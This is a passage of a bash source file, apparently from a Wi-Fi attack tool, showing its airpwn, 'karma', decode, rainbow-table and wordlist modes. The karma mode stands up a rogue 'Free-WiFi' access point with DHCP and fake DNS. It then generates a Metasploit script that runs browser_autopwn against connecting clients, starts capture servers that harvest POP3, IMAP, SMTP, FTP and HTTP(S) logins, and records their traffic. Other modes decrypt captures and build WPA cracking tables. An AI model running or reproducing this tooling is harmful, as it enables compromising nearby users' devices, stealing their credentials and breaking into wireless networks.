   #ifconfig wlan0ap up
   #airpwn –i $inCard –o $outCard –c conf/greet_html -vvv

# action "aireplay-ng (Inject)" "airtun-ng -a $bssid $monitorInterface" &
# action "aireplay-ng (Inject)" "ifconfig at0 192.168.1.83 netmask 255.255.255.0 up" &
# sleep 1

   #----------------------------------------------------------------------------------------------#
   display info "Attacking! ...press CTRL+C to stop"
   if [ "$diagnostics" == "true" ]; then echo "-Ready!----------------------------------" >> $logFile; echo -e "Ready @ $(date)" >> $logFile; fi
   sleep 2
   while [ "$(pgrep airpwn)" ]; do
      sleep 1
   done
#----------------------------------------------------------------------------------------------#
elif [ "$mode" == "karma" ]; then
   command=$(netstat -apn | grep " 80/")
   if [ "$command" ]; then
      display error "Port 80 (Web server) isn't free" 1>&2;
      command=$(netstat -apn | grep " 80/" | awk -F " " '{print $7}' | sed  's/\/.*//')
      action "Killing" "kill $command; sleep 1" # to prevent interference
      command=$(netstat -apn | grep " 80/"); if [ "$command" ]; then display error "Couldn't free port 80 (Web server)" 1>&2; cleanUp; fi
   fi
   command=$(netstat -apn | grep " 53/")
   if [ "$command" ]; then
      display error "Port 53 (DNS) isn't free" 1>&2;
      command=$(netstat -apn | grep " 53/" | awk -F " " '{print $7}' | sed  's/\/.*//')
      action "Killing" "kill $command; sleep 1" # to prevent interference
      command=$(netstat -apn | grep " 53/"); if [ "$command" ]; then display error "Couldn't free port 53 (DNS)" 1>&2; cleanUp; fi
   fi
   action "Access Point" "killall dhcpd tcpdump airbase-ng; airbase-ng -P -C 30 -e \"Free-WiFi\" -v $monitorInterface" "true" "0|0|7" & sleep 2
   action "Permission" "ifconfig at0 up 10.0.0.1 netmask 255.255.255.0; ifconfig at0 mtu 1800; iptables -t nat -A PREROUTING -i at0 -j REDIRECT; mv \"/etc/dhcp3/dhcpd.conf\" \"/etc/dhcp3/dhcpd.conf.bkup\""
   echo "default-lease-time 60;
max-lease-time 72;
ddns-update-style none;
authoritative;
log-facility local7;

subnet 10.0.0.0 netmask 255.255.255.0 {
  range 10.0.0.100 10.0.0.254;
  option routers 10.0.0.1;
  option subnet-mask 255.255.255.0;
  option broadcast-address 10.0.0.255;
  option domain-name-servers 10.0.0.1;
  option domain-name \"Home.com\";
}" > "/etc/dhcp3/dhcpd.conf"

echo -e "#Credit to: HDM @ http://metasploit.com/users/hdm/tools/karma.rc
db_driver sqlite3
db_connect \"$(pwd)/karma/$(date +%Y-%m-%d_%k-%M).db\"\n
use auxiliary/server/browser_autopwn\n
setg AUTOPWN_HOST 10.0.0.1
setg AUTOPWN_PORT 55550
setg AUTOPWN_URI /ads\n
set LHOST 10.0.0.1
set LPORT 45000
set SRVPORT 55550
set URIPATH /ads\n
run\n
use auxiliary/server/capture/pop3
set SRVPORT 110
set SSL false
run\n
use auxiliary/server/capture/pop3
set SRVPORT 995
set SSL true
run\n
use auxiliary/server/capture/ftp
run\n
use auxiliary/server/capture/imap
set SSL false
set SRVPORT 143
run\n
use auxiliary/server/capture/imap
set SSL true
set SRVPORT 993
run\n
use auxiliary/server/capture/smtp
set SSL false
set SRVPORT 25
run\n
use auxiliary/server/capture/smtp
set SSL true
set SRVPORT 465
run\n
use auxiliary/server/fakedns
unset TARGETHOST
set SRVPORT 5353
run\n
use auxiliary/server/fakedns
unset TARGETHOST
set SRVPORT 53
run\n
use auxiliary/server/capture/http
set SRVPORT 80
set SSL false
run\n
use auxiliary/server/capture/http
set SRVPORT 8080
set SSL false
run\n
use auxiliary/server/capture/http
set SRVPORT 443
set SSL true
run\n
use auxiliary/server/capture/http
set SRVPORT 8443
set SSL true
run" > "$(pwd)/tmp/karma.rc"
   action "DHCP" "mkdir -p /var/run/dhcpd && chown dhcpd:dhcpd /var/run/dhcpd; dhcpd3 -f -cf /etc/dhcp3/dhcpd.conf -pf /var/run/dhcpd/dhcpd.pid at0" "true" "0|150|5" & sleep 2
   action "TCPDump" "tcpdump -ni at0 -s 0 -w \"$(pwd)/karma/$(date +%Y-%m-%d_%k-%M).cap\"" "true" "0|250|5" & sleep 2
   action "KARMetasploit" "msfconsole -r \"$(pwd)/tmp/karma.rc\"" "true" "0|350|15" & sleep 2

   if [ "$displayMore" == "true" ]; then
      display more "Wait for the target(s) to connect, then type in \"db_notes\" in the KARMetasploit window, or view the capture & database files offline (For example, by using either \"wireshark\" or \"sqlite3\")"
   fi
   display info "Attacking! ...press CTRL+C to stop"
   if [ "$diagnostics" == "true" ]; then echo "-Ready!----------------------------------" >> $logFile; echo -e "Ready @ $(date)" >> $logFile; fi
   while [ "$(pgrep airbase-ng)" ]; do
      sleep 1
   done
   #wireshark "$(pwd)/karma/$(date +%Y-%m-%d---%k-%M).cap"
   #sqlite3 "$(pwd)/karma/$(date +%Y-%m-%d---%k-%M).db" # SELECT * FROM notes;
#----------------------------------------------------------------------------------------------#
elif [ "$mode" == "decode" ]; then # Needs work - Search the DB, search a certain folder
   encryption=""; essid=""; key=""; path=""
   if [ -e "wiffy.keys" ]; then
      index="-1" # so its starts at 0
      while read line; do
         match=$(echo ${line%%:*} | tr -d " ")
         value="${line#*: }"
         case $match in
            ESSID)      index=$(($index+1)); dbESSID[$index]=$value;;
            BSSID)      dbBSSID[$index]=$value;;
            Encryption) dbEncr[$index]=$value;;
            Key)        dbKey[$index]=$value;;
         esac
      done < "$(pwd)/wiffy.keys"

      echo -e "--------------------------------------------------------------\n| Num |              ESSID               |       BSSID       |\n|-----|----------------------------------|-------------------|"
      for ((i=0; i<${#dbESSID[@]}; i++)); do
          printf "|  %-2s | %-32s | %-16s |\n" "$(($i+1))" "${dbESSID[${i}]}" "${dbBSSID[${i}]}"
      done
      s="\e[01;35m"; n="\e[00m"
      tmp="--------------------------------------------------------------\n[-] ["$s"M"$n"]anual"; if [ "$i" -gt 0 ]; then tmp="$tmp or num ["$s"1"$n"-"$s"$i"$n"]"; fi
      echo -e $tmp

      id=""
      while [ -z $id ]; do
         echo -ne "\e[00;33m[~]\e[00m "; read -p "Select option: "
         if [[ "$REPLY" =~ ^[Xx]$ ]]; then cleanUp menu
         elif [[ "$REPLY" =~ ^[Mm]$ ]]; then break
         elif [ $(echo $REPLY | tr -dc '[:digit:]') ] && [ "$REPLY" -gt "0" ] && [ "$REPLY" -lt "$((i+1))" ]; then id="$((REPLY-1))"; fi
      done
      if [ "$id" ]; then
         if  [[ "${dbEncr[$id]}" == *WEP* ]]; then encryption="WEP"
         elif [[ "${dbEncr[$id]}" == *WPA* ]]; then encryption="WPA ascii"
         else display error "Something went wrong )=   [10]" 1>&2; fi
         essid=${dbESSID[$id]}
         key=${dbKey[$id]}
      fi
   fi

   if [ -z $id ]; then
      while [ -z "$essid" ]; do
         echo -ne "\e[00;33m[~]\e[00m "; read -p "What is the SSID?: "
         essid="$REPLY"
      done

      echo -e "1.) WEP (HEX)\n2.) WPA (HEX)\n3.) WPA (ASCII)"
      while [ -z "$encryption" ]; do
         echo -ne "\e[00;33m[~]\e[00m "; read -p "Select option [1-3]: "
         if [[ "$REPLY" =~ ^[Xx]$ ]]; then cleanUp menu
         elif [ "$REPLY" = "1" ]; then encryption="WEP"
         elif [ "$REPLY" = "2" ]; then encryption="WPA hex"
         elif [ "$REPLY" = "3" ]; then encryption="WPA ascii"; fi
      done

      while [ -z "$key" ]; do
         echo -ne "\e[00;33m[~]\e[00m "; read -p "What is the key?: "
         key="$REPLY"
      done
   fi

   i=0
   echo -e "----------------------------------------------------------------------------------------\n| Num |                            File                            | In DB? | Decoded? |\n|-----|------------------------------------------------------------|--------|----------|"
   for f in $decodeFolder; do
      if [ "$f" != "$decodeFolder" ]; then
         cap[${i}]="$f"; filename=$(basename $f); capDB="No"; deCoded="No"

         command="|  %-2s | %-58s |"

         if grep -q "$filename" "$(pwd)/wiffy.keys"; then command="$command   \e[01;32m%-4s\e[00m |\n"; capDB="Yes" # In DB? - Have we already cracked it?
         else command="$command   %-4s |"; fi

         if [[ "$filename" == *-dec.cap ]]; then command="$command    \e[01;32m%-5s\e[00m |\n"; deCoded="Yes"   # Has it already been decoded
         else command="$command    %-5s |\n"; fi

         printf "$command" "$((i+1))" "$filename" "$capDB" "$deCoded"
         i=$((i+1))
      fi
   done
   echo "----------------------------------------------------------------------------------------"

   tmp="[-] Enter "$s"location"$n; if [ "$i" -gt 0 ]; then tmp="$tmp or num ["$s"1"$n"-"$s"$i"$n"]"; fi
   echo -e $tmp

   while [ -z "$path" ]; do
      echo -ne "\e[00;33m[~]\e[00m "; read -p "Select option: "
      if [[ "$REPLY" =~ ^[Xx]$ ]]; then cleanUp menu
      elif [ $(echo $REPLY | tr -dc '[:digit:]') ] && [ "$REPLY" -gt "0" ] && [ "$REPLY" -lt "$((i+1))" ]; then path="${cap[$((REPLY-1))]}"
      elif [ -e "$REPLY" ]; then path="$REPLY"; fi
   done

   display action "Decoding: Cap"
   command="airdecap-ng -e \"$essid\""
   if [ "$encryption" == "WEP" ]; then command="$command -w"
   elif [ "$encryption" == "WPA hex" ]; then command="$command -k"
   elif [ "$encryption" == "WPA ascii" ]; then command="$command -p"; fi
   command="$command $key $path"
   action "Decrypting" "$command"
#----------------------------------------------------------------------------------------------#
elif [ "$mode" == "table" ]; then
   essid=""

   while [ -z "$essid" ]; do
      echo -ne "\e[00;33m[~]\e[00m "; read -p "What is the SSID?: "
      essid="$REPLY"
   done

   if [ "$wpaSoftware" == "aircrack-ng" ]; then
      command="echo \"$essid\" > \"$(pwd)/tmp/wiffy.tmp\" && airolib-ng \"$(pwd)/table/$essid.hash\" --import essid \"$(pwd)/tmp/wiffy.tmp\";"
      if [ -d "$wordlist" ]; then
         for file in "$wordlist"*; do
            command="$command airolib-ng \"$(pwd)/table/$essid.hash\" --import passwd \"$file\";"
         done
      else command="$command airolib-ng \"$(pwd)/table/$essid.hash\" --import passwd \"$wordlist\";"; fi
      command="$command airolib-ng \"$(pwd)/table/$essid.hash\" --stats && airolib-ng \"$(pwd)/table/$essid.hash\" --clean all && airolib-ng \"$(pwd)/table/$essid.hash\" --batch && airolib-ng \"$(pwd)/table/$essid.hash\" --verify all"
   elif [ "$wpaSoftware" == "cowpatty" ]; then
      if [ -d "$wordlist" ]; then
         for file in "$wordlist"*; do
             command="$command genpmk -s \"$essid\" -d \"$(pwd)/table/$essid.hash\" -f \"$file\";"
         done
      else command="$command genpmk -s \"$essid\" -d \"$(pwd)/table/$essid.hash\" -f \"$wordlist\";"; fi
   elif [ "$wpaSoftware" == "pyrit" ]; then
      if [ -d "$wordlist" ]; then
         for file in "$wordlist"*; do
             command="$command pyrit -i \"$file\" import_passwords;"
         done
      else command="$command pyrit -i \"$wordlist\" import_passwords;"; fi
      command="$command pyrit -e \"$essid\" create_essid; pyrit batch;"
   fi
   action "Creating Tables" "$command" "true" "0|0|15"
elif [ "$mode" == "wordlist" ]; then
   if [ -d "$wordlist" ]; then
      wordlistType="folder"
      newFilename="wiffy-AIO.lst"
   else
      wordlistType="file"
      filename=$(basename $wordlist)
      extension=${filename##*.}
      filename=${filename%.*}
      newFilename="$filename-new.$extension"
   fi

   while true; do
      if [ "$wordlistType" == "folder" ]; then command="cat \"$wordlist\"*"
      else command="cat \"$wordlist\""; fi

      s="\e[01;35m"; n="\e[00m"
      echo -e "----------------------------"$s"Wordlist Menu"$n"-------------------------------"
      if [ "$wordlistType" == "folder" ]; then echo -e "[-] ["$s"C"$n"]ombines all files into one file"; fi
      echo -e "[-] ["$s"A"$n"]lphabetize and remove the duplicates"
      echo -e "[-] ["$s"D"$n"]uplicated words in frequency duplicated, then alphabetize"
      echo -e "[-] Make wordlist ["$s"W"$n"]PA/WPA2 compatiable (Remove <8, >63 chars)"
      echo -e "\n[-] Change output ["$s"F"$n"]ilename ($newFilename)"
      echo -e "[-] E["$s"x"$n"]it"
      while true; do
         echo -ne "\e[00;33m[~]\e[00m "; read -p "Select option: "
         if [[ "$REPLY" =~ ^[Xx]$ ]]; then break 2
         elif [[ "$REPLY" =~ ^[Cc]$ ]] && [ "$wordlistType" == "folder" ]; then command="$command > \"$(pwd)/tmp/wiffy.txt\" && mv \"$(pwd)/tmp/wiffy.txt\" \"$wordlist$newFilename\""; break
         elif [[ "$REPLY" =~ ^[Aa]$ ]]; then command="$command | sort | uniq > \"$(pwd)/tmp/wiffy.txt\" && mv \"$(pwd)/tmp/wiffy.txt\" \"$wordlist$newFilename\""; break
         elif [[ "$REPLY" =~ ^[Dd]$ ]]; then command="$command | sort | uniq -d -c | sort -r | sed -e 's/^ *//' | sed -E 's/^[0-9]+ //' > \"$(pwd)/tmp/wiffy.txt\" && $command | sort | uniq -u >> \"$(pwd)/tmp/wiffy.txt\" && mv -f \"$(pwd)/tmp/wiffy.txt\" \"$wordlist$newFilename\""; break
         elif [[ "$REPLY" =~ ^[Ww]$ ]]; then command="$command | pw-inspector -m 8 -M 63 > \"$(pwd)/tmp/wiffy.txt\" && mv \"$(pwd)/tmp/wiffy.txt\" \"$wordlist$newFilename\""; break
         elif [[ "$REPLY" =~ ^[Ff]$ ]]; then echo -ne "\e[00;33m[~]\e[00m "; read -p "Filename?: "; newFilename="$REPLY"; break; fi
      done
      action "Wordlist" "$command"
   done
fi
#----------------------------------------------------------------------------------------------#
if [ "$diagnostics" == "true" ]; then echo "-Done!---------------------------------------------------------------------------------------" >> $logFile; fi
cleanUp clean



#---Ideas/Notes/DumpPad------------------------------------------------------------------------#
#Fix - Crack - Offline attack - update DB (Missing ESSID at the mo.)
#Fix - Karma - Change to Postgres (and install it!)
#Fix - Karma - DHCP error (.PID & permission)
#Fix - Scan Menu - Dup results (either add a check or Improve patten )
#*** Convert to python ***
#Check - Benchmark - Are times correct? Fix other modes too
#Check - Code for hidden comments;) #/***/YET
#Check - "Connect" function
#Check - Crack - ALWAYS (Auto & Single) return to scan menu
#Check - "MAC Filting" function
#Idea - Crack - AP-less/CloneAP (WEP) - DeAuth THEN create AP? Use the Same MAC as real when cloning?
#Idea - Crack - brute WEP.     10 10 \"0123456789abcdef\" = 64     13 13 \"0123456789abcdef\" = 128      16 16 \"0123456789abcdef\" = 152      29 29 \"0123456789abcdef\" = 256  #(YET) ***
#Idea - Crack - Improve Hidden SSID (Check probes, clients, database)
#Idea - Crack - Switch setup & checkDB stage?
#Idea - Crack - WEP - Able to skip WEP attacks, rescan for clients during attack (again)
#Idea - Crack - WEP - Select attack method order
#Idea - Crack - WPA - Use options for brute Force (How short (min 8), how long, What to use)
#Idea - Crack - WPA - Use Rainbow tables
#Idea - Decode/Karma - Open with wireshark/other afterwords?
#Idea - Display - Fix hour(s) and minute(s)
#Idea - Enable "-t target" select (again) (as well checking for any other variables)
#Idea - function checkIfRunning pgetp or command=$(ps aux | grep "airodump-ng" | awk '!/grep/ && !/awk/ && !/wiffy/ {print $2}')
#Idea - Main menu - Something to do with DB and/or stats?
#Idea - Menus - Don't display table if if no results
#Idea - Menus - Sorting.
#Idea - Mode - "Capture" Mode. (For "decode" mode)
#Idea - Mode - "Harvest" Mode. (Collect caps, move but don't crack after!)
#Idea - Scan menu - Add option to keep scanning for longer
#Idea - Scan menu back to Main Menu (Big loop?)
#Idea - Scan menu - Select multiple ESSID's. e.g. 1, 2, 5-7
#karmaESSID="Free-WiFi"
#bruteLengthMin=8
#bruteLengthMax=13
#bruteCharacter="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
#crackRainbowTable="/path/to.file"
#mac="/client/random/01:23:45.." #Compress into one!

#---DumpCode-----------------------------------------------------------------------------------#
#pyrit -r "$pathCap" -o "$pathCap.stripped" strip #Compress WPA

#aircrack-ng -r "$(pwd)/table/$essid.hash" "$pathCap"
#pyrit -r "$pathCap" attack_db
#pyrit -u sqlite:///wiffy.db -i "$wordlist" import_passwords
